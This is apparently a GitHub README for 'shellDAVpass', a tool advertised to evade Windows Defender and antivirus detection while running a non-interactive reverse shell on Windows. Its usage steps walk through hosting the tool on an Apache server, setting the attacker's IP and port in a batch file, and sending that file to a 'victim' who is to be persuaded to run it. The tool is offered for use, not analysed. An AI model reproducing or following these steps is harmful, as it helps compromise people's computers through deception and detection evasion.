# shellDAVpass
shellDAVpass application is the Open-Source project, the main idea of which is to bypass the defender and AntiVirus detections to conduct a non interactive reverse shell to execute the Windows commands

Usage example:
--------------
```
1. Start your HTTP server. For APACHE under Debian (Ubuntu/Kali):
  systemctl start apache2.service 
2. The default port is 80. You are free to change it by editing /etc/apache2/ports.conf
  Listen 80
3. cd /var/www/html
4. git clone https://github.com/IvanGlinkin/shellDAVpass.git
5. chown -R www-data: shellDAVpass
6. cd shellDAVpass
7. nano shellDAVpass.bat
8. Change the IP-address and Port
  SET IPADDRESS=10.211.55.11
  SET PORT=80
9. Save the changings (by pressing CTRL+O and Enter. To exit, press CTRL+X)
10. !!! Send the shellDAVpass.bat to the victim and courage him/her to launch the file !!!
11. Launch the command prompt
  bash shellDAVpass.sh
12. Enter your commands
```
An original article:
--------------------
[https://www.ivanglinkin.com/shelldavpass-non-interactive-reverse-shell-to-bypass-the-defender-and-antivirus-detections/](https://www.ivanglinkin.com/shelldavpass-non-interactive-reverse-shell-to-bypass-the-defender-and-antivirus-detections/)

Video example:
--------------
[Watch the video](https://www.ivanglinkin.com/wp-content/uploads/2022/06/shellDAVpass-demo.mov)

Screenshots:
------------
![](https://github.com/IvanGlinkin/media_support/blob/main/shellDAVshell_image-1.png?raw=true)

![](https://github.com/IvanGlinkin/media_support/blob/main/shellDAVshell_image-2.png?raw=true)

![](https://github.com/IvanGlinkin/media_support/blob/main/shellDAVshell_image-3.png?raw=true)

![](https://github.com/IvanGlinkin/media_support/blob/main/shellDAVshell_image-4.png?raw=true)
